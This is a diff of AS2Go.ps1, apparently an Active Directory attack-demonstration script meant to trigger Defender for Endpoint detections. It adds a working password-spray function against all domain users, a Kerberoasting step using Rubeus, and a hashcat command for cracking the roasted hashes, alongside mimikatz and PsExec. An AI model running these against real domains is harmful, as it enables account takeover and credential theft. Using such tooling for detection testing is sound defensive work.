@@ -19,8 +19,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-10-13
-File Name  : AS2Go.ps1 | Version 2.1.1
+last update: 2022-10-30
+File Name  : AS2Go.ps1 | Version 2.5.5
 Author     : Holger Zimmermann | holgerz@semperis.com | @HerrHozi
 
 
@@ -45,6 +45,7 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
+# 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
 # 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser
 # 2022-09-20 | v2.0.9 |  Update Get-LocalGroupMember -Group "Administrators" | ft
@@ -68,8 +69,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-$lastupdate   = "2022-10-13"
-$version      = "2.1.1.000" 
+$lastupdate   = "2022-10-30"
+$version      = "2.5.5.0" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -87,8 +88,9 @@ $InitialStart = "Start"
 $PrivledgeAccount = $no
 
 $stage00 = "COMPROMISED User Account"
+$stage05 = "BRUCE FORCE or PW SPRAY"
 $stage10 = "RECONNAISSANCE"
-$stage20 = "Lateral Movement"
+$stage20 = "LATERAL MOVEMENT"
 $stage30 = "ACCESS SENSITIVE DATA"
 $stage40 = "DOMAIN COMPROMISED"
 $stage50 = "COMPLETE"
@@ -111,6 +113,43 @@ $GroupGPO  = "Group Policy Creator Owners"
 ######                            All Functions                            #####
 ######                                                                     #####
 ################################################################################
+
+Function New-PasswordSprayAttack()
+{
+
+    Param([string] $Domain, [string] $Password, [string] $SearchBase)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+
+        $i = 0
+        $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
+        Foreach ($ADUSer in $ADUsers) 
+        {
+           $i += 1
+           $user =   $Domain + "\" + $ADUSer.samaccountname
+           Set-ProgressBar -Step $i -User $user -TotalSteps $ADUsers.Count
+        
+           $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("",$user,$Password)
+           if ($Domain_check.name -ne $null)
+              {
+              Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+              }
+         }
+
+#####
+Write-Log -Message "### End Function $myfunction ###"
+
+}
+
+
+Function Set-ProgressBar 
+{
+    Param ([int] $Step, [int] $TotalSteps, [string] $User)
+
+    $progress = [int] (($Step - 1) / $TotalSteps * 100)
+    Write-Progress -Activity "Run Password Spray against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
+}
 
 
 
@@ -1557,7 +1596,8 @@ Write-Host "Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName" -For
 Write-Host ""
 
 # enumerate all computer accounts 
-Get-ADComputer -Filter * -Properties * | Select -Property Name,DNSHostName,Enabled,LastLogonDate,operatingSystem | ft
+$attributes = @("Name", "Enabled", "OperatingSystem", "DistinguishedName")
+Get-ADComputer -Filter * -Properties $attributes | Select -Property $attributes | ft
 
 
 
@@ -1716,16 +1756,28 @@ Write-Log -Message "### Start Function $myfunction ###"
 
 If ((Test-Path -Path "$path\$filename" -PathType Leaf) -eq $false)
     {
+    $result = ""
     Write-Host ""
     Write-Warning "Cannot find file - $filename!!"
     Write-Host ""
     If ($filename.ToUpper() -eq "AS2Go.xml".ToUpper())
-    {
-    Write-Host "`n`nProbably you started the PoSH Script $scriptName `nfrom the wrong directory $configFile!" -ForegroundColor $global:FGCError
-    exit
-    }
+       {
+       Write-Host "`n`nProbably you started the PoSH Script $scriptName `nfrom the wrong directory $configFile!" -ForegroundColor $global:FGCError
+       exit
+       }
     Pause
     }
+    else
+    {
+    [datetime] $LastWriteTime    = (get-item "$path\$filename").LastWriteTime
+    [String]   $FileVersion      = (get-item "$path\$filename").VersionInfo.FileVersion
+    $build = Get-date -date $LastWriteTime -Format yyyyMMdd
+    $release =  ("Release: " +  $FileVersion.PadRight(9,[Char]32) + "(last build $build)")
+    Write-Log -Message "Version of $filename is $release!"
+    #write-host $release 
+    }
+
+    return $release 
 
 #####
 Write-Log -Message "### End Function $myfunction ###"
@@ -1785,10 +1837,11 @@ Write-Log -Message "."
 Write-Log -Message "."
 
 # check the correct directory and requirements
-Check-FileAvailabliy -filename "AS2Go.xml"
-Check-FileAvailabliy -filename "mimikatz.exe"
-Check-FileAvailabliy -filename "PsExec.exe"
-Check-FileAvailabliy -filename "NetSess.exe"
+$FileVersionA = Check-FileAvailabliy -filename "AS2Go.xml"
+$FileVersionM = Check-FileAvailabliy -filename "mimikatz.exe"
+$FileVersionP = Check-FileAvailabliy -filename "PsExec.exe"
+$FileVersionR = Check-FileAvailabliy -filename "Rubeus.exe"
+$FileVersionN = Check-FileAvailabliy -filename "NetSess.exe"
 
 Check-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
 Import-Module ActiveDirectory
@@ -1833,16 +1886,19 @@ Write-Host "        last update $lastupdate                                     
 Write-Host "                                                                    "
 Write-Host "        Used tools & requirements:                                  "
 Write-Host "                                                                    "
-Write-Host "         ●  mimikatz.exe                                             "
-Write-Host "         ●  NetSess.exe - enumerate NetBIOS Sessions                 "
-Write-Host "         ●  PsExec.exe                                               "
-Write-Host "         ●  Powershell ACTIVE DIRECTORY module                       "
+Write-Host "        ●  ACTIVE DIRECTORY PoSH module                       "
+Write-Host "        ●  Mimikatz.exe   $FileVersionM                            "
+Write-Host "        ●  Rubeus.exe     $FileVersionR                            "
+Write-Host "        ●  NetSess.exe    $FileVersionN                            "
+Write-Host "        ●  PsExec.exe     $FileVersionP                            n"
 Write-Host "____________________________________________________________________`n" 
 
 $TimeStamp    = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
 $lastVictim   = Get-KeyValue -key "LastVictim"
 $lastRun      = Get-KeyValue -key "LastStart" 
 $lastDuration = Get-KeyValue -key "LastDuration" 
+
+
 
 Write-Host "`n  Current Date & Time: $TimeStamp" 
 Write-Host ""
@@ -1865,6 +1921,65 @@ Pause
 
 Clear-Host
 Get-AS2GoSettings
+
+
+
+################################################################################
+######                                                                     #####
+######                Attack Level -  Bruce Force Account                  #####
+######                                                                     #####
+################################################################################
+Clear-Host
+Update-WindowTitle -NewTitle $stage05
+#Set-KeyValue -key "LastStage" -NewValue $stage10
+Show-Step -step "step_006.html"
+Do 
+{
+Clear-Host
+Write-Host "____________________________________________________________________`n" 
+Write-Host "                   Attack Level - Bruce Force Account                    "
+Write-Host "               in this case we run an Password Spray Attack         "
+Write-Host "____________________________________________________________________`n" 
+
+$question = "`nDo you want to run this step - Y or N? Default "
+$answer   = Get-Answer -question $question -defaultValue $No
+
+If ($answer -eq $yes)
+{
+
+Write-Host "`n`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
+Get-ADDefaultDomainPasswordPolicy
+pause
+
+$MyDomain = $env:USERDNSDOMAIN
+$MyPath   = Get-KeyValue -key "MySearchBase"
+
+#first run with random password
+$MyPW     = Get-RandomPassword
+New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW -SearchBase $MyPath
+
+}
+elseIf ($answer -eq $exit)
+{
+    Stop-AS2GoDemo
+}
+else
+{
+}
+
+
+Clear-Host
+
+Write-Host "____________________________________________________________________`n" 
+Write-Host "        ??? REPEAT | Attack Level - Bruce Force Account  ???             "
+Write-Host "____________________________________________________________________`n" 
+
+# End "Do ... Until" Loop?
+$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+$repeat   = Get-Answer -question $question -defaultValue $no
+   
+} Until ($repeat -eq $no)
+
 }
 else
 {
@@ -2031,7 +2146,7 @@ If ($answer -eq $yes)
     $error.Clear()
     Try{
     $attributes = @("AccountExpirationDate","CannotChangePassword","CanonicalName","cn","Created","Department","Description","DisplayName","EmployeeNumber","Enabled","Country","l","Manager","MemberOf","MobilePhone","userAccountControl","UserPrincipalName","LastBadPasswordAttempt","title")
-    get-aduser -Identity VI-HIP2022 -Properties $attributes -ErrorAction Stop
+    get-aduser -Identity $victim -Properties $attributes -ErrorAction Stop
 
     
     }
@@ -2183,6 +2298,66 @@ Clear-Host
 
 Write-Host "____________________________________________________________________`n" 
 Write-Host "        ??? REPEAT | Attack Level - LATERAL MOVEMENT  ???           "
+Write-Host "____________________________________________________________________`n" 
+
+# End "Do ... Until" Loop?
+$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+$repeat   = Get-Answer -question $question -defaultValue $no
+   
+} Until ($repeat -eq $no)
+
+
+
+################################################################################
+######                                                                     #####
+######                Attack Level -  Kerberoasting Attack                 #####
+######                                                                     ##### 
+######     technique used by attackers, which allows them to request       #####
+######     a service ticket for any service with a registered SPN.         #####
+######                                                                     #####
+################################################################################
+
+Update-WindowTitle -NewTitle $stage20
+Set-KeyValue -key "LastStage" -NewValue $stage20
+#Show-Step -step "step_007.html"
+Do 
+{
+Clear-Host
+Write-Host "____________________________________________________________________`n" 
+Write-Host "                 Attack Level -  Kerberoasting Attack               "
+Write-Host "____________________________________________________________________`n" 
+
+$myDomain = $env:USERDNSDOMAIN
+$hashes   = "$myDomain.hashes.txt"
+
+write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
+Write-Host "NEXT STEP: " -NoNewline
+Write-Host ".\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes" -ForegroundColor $global:FGCCommand
+
+$question = "`nDo you want to run this step - Y or N? Default "
+$answer   = Get-Answer -question $question -defaultValue $No
+
+If ($answer -eq $yes)
+{   
+
+   .\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes
+    Invoke-Item .\$hashes
+    
+    pause
+    Write-Host "`n"
+    write-host "The next step is cracking the roasted hashes, HASHCAT is good tool for this." -ForegroundColor Yellow
+    Write-Host "The cracking mode for TGS-REP hashes is 13100`n"
+    Write-Host "example: " -NoNewline
+    Write-host "hashcat.exe -a 3 -m 13100 ./$hashes -1 123  -2 eqw ?1?2?1?2?1?2?s?u" -ForegroundColor Yellow
+  
+    pause
+    
+}
+
+Clear-Host
+
+Write-Host "____________________________________________________________________`n" 
+Write-Host "        ??? REPEAT | Attack Level - Kerberoasting Attack  ???           "
 Write-Host "____________________________________________________________________`n" 
 
 # End "Do ... Until" Loop?
